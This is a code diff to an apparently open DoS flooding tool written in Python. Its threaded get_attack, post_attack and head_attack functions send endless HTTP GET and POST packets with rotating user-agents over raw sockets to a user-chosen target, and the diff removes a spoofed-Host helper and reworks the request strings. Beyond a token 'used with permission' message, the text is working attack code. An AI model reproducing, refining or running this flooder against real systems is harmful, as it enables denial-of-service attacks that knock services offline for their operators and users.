@@ -20,8 +20,6 @@ doseq = __file__
 __version__ = '1.0.0'
 i = 1
 attacks = ["get","post","head","tcp","udp"]
-fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
-
 headers_useragents = list()
 headers_useragents.append("Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36")
 headers_useragents.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
@@ -3380,7 +3378,7 @@ def get_attack():
          global i
          while True:
              try:
-                        get_packet = str("GET /{target} HTTP/1.1\r\nHost: {fake_ip()}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
+                        get_packet = str("GET / HTTP/1.1\r\nHost: {target}\n\n User-Agent: {random.choice(headers_useragents)}\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.settimeout(5)
                         s.connect((target,port))
@@ -3407,7 +3405,7 @@ def post_attack():
     global i
     while True:
         try:
-               post_packet = f'POST /{target} HTTP/1.1\r\nHost: {fake_ip()}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.encode("ascii")
+               post_packet = f'POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.encode("ascii")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target,port))
@@ -3488,7 +3486,6 @@ def head_attack():
             continue
         if isKilled():break
 
-
 def cnet(server='www.google.com', port=80) -> bool:
    try:
       c = socket.create_connection((socket.gethostbyname(server), port), 2)
@@ -3496,7 +3493,6 @@ def cnet(server='www.google.com', port=80) -> bool:
       return True
    except socket.error:pass
    return False
-
 
 def quit(sig,fream):
     print(rd+"\n["+yl+"!"+rd+"]"+yl+" User requested shutdown. "+rd+"..."+wi)
@@ -3509,7 +3505,6 @@ def quit(sig,fream):
     if started:
         print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
     sys.exit(0)
-
 
 def update_doseq():
     if not cnet("raw.githubusercontent.com",80):
@@ -3648,7 +3643,7 @@ print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr +
 time.sleep(2)
 if not cnet(target,port):
     print("["+rd+"-"+wi+"] Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
-    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+f"::: {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target and port'} !!!\n"+wi)
+    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+wi+"  ::: "+yl+f" {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target and port'} "+rd+"!!!\n"+wi)
     sys.exit(1)
 print("["+gr+"+"+wi+"]"+wi+f" Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi+"["+yl+"~"+wi+"] Starting "+gr+f"{threads}"+wi+" Threads [...]", end='\r')
